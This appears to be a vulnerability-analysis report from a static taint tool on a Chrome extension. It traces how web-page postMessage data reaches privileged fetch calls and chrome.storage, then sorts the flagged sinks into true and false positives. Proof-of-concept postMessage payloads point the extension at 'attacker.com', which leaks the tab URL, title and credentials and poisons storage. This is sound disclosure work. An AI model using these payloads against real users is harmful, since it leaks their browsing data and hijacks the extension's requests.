# CoCo Analysis: efmkabaffmfejkjiibjccnnpklhimepm

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 11 (4 window_postMessage_sink, 2 fetch_resource_sink, 1 chrome_storage_local_set_sink, 4 additional window_postMessage_sink)

---

## Sink 1-2: cs_window_eventListener_message → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/efmkabaffmfejkjiibjccnnpklhimepm/opgen_generated_files/cs_0.js
Line 509: window.addEventListener("message", function(event) {
Line 516: if (event.data.type && (event.data.type === "GET_ACCESS_TOKEN")) {
Line 519: domain: event.data.domain,

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/efmkabaffmfejkjiibjccnnpklhimepm/opgen_generated_files/bg.js
Line 1137: fetch(`${request.data.domain.replace(/^(?:(.*:)?\/\/)?(.*)/i, (match, schemma, nonSchemmaUrl) => schemma ? match : `https://${nonSchemmaUrl}`)}/wp-json/chadwickmarketingsocial/v1/token`
Line 1164: fetch(`${request.data.domain.replace(/^(?:(.*:)?\/\/)?(.*)/i, (match, schemma, nonSchemmaUrl) => schemma ? match : `https://${nonSchemmaUrl}`)}/wp-json/chadwickmarketingsocial/v1/links`

**Code:**

```javascript
// Content script - Entry point (cs_0.js)
window.addEventListener("message", function(event) {
  if (event.source !== window) return;
  onDidReceiveMessage(event);
});

async function onDidReceiveMessage(event) {
  if (event.data.type && (event.data.type === "GET_ACCESS_TOKEN")) {
    chrome.runtime.sendMessage({type: "GET_ACCESS_TOKEN", data: {
      password: event.data.password,  // <- attacker-controlled
      domain: event.data.domain,      // <- attacker-controlled
      username: event.data.user,      // <- attacker-controlled
    }});
  }
}

// Background script - Message handler (bg.js)
chrome.runtime.onMessage.addListener(function (request, sender) {
  if (request.type == "GET_ACCESS_TOKEN") {
    chrome.tabs.query({
      active: true,
      currentWindow: true
    }, function (tabs) {

      // SSRF Sink 1 - attacker controls domain in URL
      fetch(`${request.data.domain.replace(/^(?:(.*:)?\/\/)?(.*)/i, (match, schemma, nonSchemmaUrl) => schemma ? match : `https://${nonSchemmaUrl}`)}/wp-json/chadwickmarketingsocial/v1/token`, {
        method: 'post',
        withCredentials: true,
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          "username": request.data.username,  // <- attacker-controlled
          "password": request.data.password   // <- attacker-controlled
        }),
      }).then( async (response) => {
        let data = await response.json();

        if(response.status === 200 && data.hasOwnProperty('token')){
          chrome.storage.local.set({
            "token":  data.token,
            "domain": request.data.domain.replace(/^(?:(.*:)?\/\/)?(.*)/i, (match, schemma, nonSchemmaUrl) => schemma ? match : `https://${nonSchemmaUrl}`)  // <- storage poisoning
          }, function () {
            let headers = new Headers();
            headers.append("Authorization", `Bearer ${data.token}`);
            headers.append("Auth-Token", `Bearer ${data.token}`);

            // SSRF Sink 2 - second fetch to attacker-controlled domain
            fetch(`${request.data.domain.replace(/^(?:(.*:)?\/\/)?(.*)/i, (match, schemma, nonSchemmaUrl) => schemma ? match : `https://${nonSchemmaUrl}`)}/wp-json/chadwickmarketingsocial/v1/links`, {
              method: 'post',
              withCredentials: true,
              body: JSON.stringify({
                "link": tabs[0].url,    // <- sends current tab URL to attacker
                "title": tabs[0].title  // <- sends current tab title to attacker
              }),
              headers: headers
            }).then( async (response) => {
              // ...
            })
          })
        }
      })
    });
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// Malicious webpage sends postMessage to inject attacker's domain
window.postMessage({
  type: "GET_ACCESS_TOKEN",
  domain: "https://attacker.com",  // Attacker's server
  user: "victim",
  password: "stolen"
}, "*");

// The extension will:
// 1. Make privileged fetch to https://attacker.com/wp-json/chadwickmarketingsocial/v1/token
// 2. Store attacker's domain in chrome.storage
// 3. Make second fetch to https://attacker.com/wp-json/chadwickmarketingsocial/v1/links
//    sending current tab URL and title to attacker
```

**Impact:** SSRF vulnerability allowing attacker to trigger privileged cross-origin requests to attacker-controlled domains. The extension sends the current tab's URL and title to the attacker's server, enabling information disclosure. Additionally, storage is poisoned with the attacker's domain for further exploitation.

---

## Sink 3: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/efmkabaffmfejkjiibjccnnpklhimepm/opgen_generated_files/cs_0.js
Line 509: window.addEventListener("message", function(event) {
Line 519: domain: event.data.domain,

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/efmkabaffmfejkjiibjccnnpklhimepm/opgen_generated_files/bg.js
Line 1156: "domain": request.data.domain.replace(/^(?:(.*:)?\/\/)?(.*)/i, (match, schemma, nonSchemmaUrl) => schemma ? match : `https://${nonSchemmaUrl}`)

**Code:**

```javascript
// Same flow as Sink 1-2, storage poisoning at line 1154-1157
chrome.storage.local.set({
  "token":  data.token,
  "domain": request.data.domain.replace(/^(?:(.*:)?\/\/)?(.*)/i, (match, schemma, nonSchemmaUrl) => schemma ? match : `https://${nonSchemmaUrl}`)  // <- attacker-controlled domain stored
}, function () {
  // ...
})

// This poisoned domain is later retrieved and used in EDIT_LINK handler
if (request.type == "EDIT_LINK") {
  chrome.storage.local.get(["token", "domain"], function (data) {
    // SSRF - fetch to poisoned domain from storage
    fetch(`${data.domain}/wp-json/chadwickmarketingsocial/v1/links/edit`, {
      method: 'post',
      withCredentials: true,
      headers: headers,
      body: JSON.stringify({
        "id": request.data.id,
        "title": request.data.title,
        "slug": request.data.slug
      })
    })
  });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** Complete storage exploitation chain - attacker poisons storage then retrieves it

**Attack:**

```javascript
// Step 1: Poison storage with attacker's domain
window.postMessage({
  type: "GET_ACCESS_TOKEN",
  domain: "https://attacker.com",
  user: "victim",
  password: "stolen"
}, "*");

// Step 2: Trigger EDIT_LINK which reads poisoned domain from storage
window.postMessage({
  type: "EDIT_LINK",
  id: "123",
  slug: "test",
  title: "test"
}, "*");

// Extension will fetch to https://attacker.com/wp-json/chadwickmarketingsocial/v1/links/edit
```

**Impact:** Complete storage exploitation chain achieving SSRF. Attacker poisons chrome.storage with malicious domain, then triggers subsequent operations that fetch to the attacker-controlled domain.

---

## Sink 4-11: storage_local_get_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/efmkabaffmfejkjiibjccnnpklhimepm/opgen_generated_files/bg.js
Line 751: var storage_local_get_source = {'key': 'value'};
Line 1007: link: data.link.shortened.permalink.replace(/(^\w+:|^)\/\//, ''),
Line 1008: slug: data.link.shortened.slug

**Code:**

```javascript
// Background reads from storage and sends to content script via chrome.tabs.sendMessage
// Content script would then postMessage to the page
// However, this is data flowing OUT from storage, not attacker-controlled data going IN
```

**Classification:** FALSE POSITIVE

**Reason:** These flows are storage_local_get → window_postMessage, which means data is flowing OUT from storage to the page. While the storage was poisoned by the attacker in the previous sinks, the postMessage sink itself is not a vulnerability - it's just reading and sending data. The actual vulnerabilities are the SSRF sinks (fetch_resource_sink) and the storage poisoning that enables them, which are already covered in Sinks 1-3.
